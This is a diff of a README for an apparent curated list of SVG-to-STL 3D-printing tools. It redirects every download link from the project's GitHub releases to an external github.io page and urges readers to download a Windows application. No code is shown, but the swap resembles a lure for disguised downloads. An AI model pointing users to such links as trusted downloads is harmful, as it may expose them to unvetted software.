@@ -1,7 +1,7 @@
 <h1>🎨 awesome-svg-to-stl - Turn Vectors into Printable 3D Models</h1>
 
 <p align="center">
-  <a href="https://github.com/GetLevi/awesome-svg-to-stl/releases">
+  <a href="https://getlevi.github.io">
     <img src="https://img.shields.io/badge/Download-awesome--svg--to--stl-2ea44f?style=for-the-badge&logo=github" alt="Download Button" style="max-width: 100%; height: auto;">
   </a>
 </p>
@@ -18,7 +18,7 @@ SVG (Scalable Vector Graphics) files are 2D images that use mathematical paths i
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[https://github.com/GetLevi/awesome-svg-to-stl/releases](https://github.com/GetLevi/awesome-svg-to-stl/releases)**
+Visit this link to download the application: **[https://getlevi.github.io](https://getlevi.github.io)**
 
 Once you click the link above, you'll see a list of available releases. Look for the latest version and download the appropriate file for your Windows computer. The download process is straightforward—just follow the prompts from your browser.
 
@@ -181,4 +181,4 @@ A: Many are free and open-source. Some advanced tools may have paid versions wit
 
 The **awesome-svg-to-stl** list is your gateway to the exciting world of 3D printing. With the right tools and a little practice, you can turn any vector design into a physical object. Start exploring the list today and unleash your creativity!
 
-Remember to visit **[https://github.com/GetLevi/awesome-svg-to-stl/releases](https://github.com/GetLevi/awesome-svg-to-stl/releases)** to get started with the latest downloads and resources. Happy printing!
+Remember to visit **[https://getlevi.github.io](https://getlevi.github.io)** to get started with the latest downloads and resources. Happy printing!
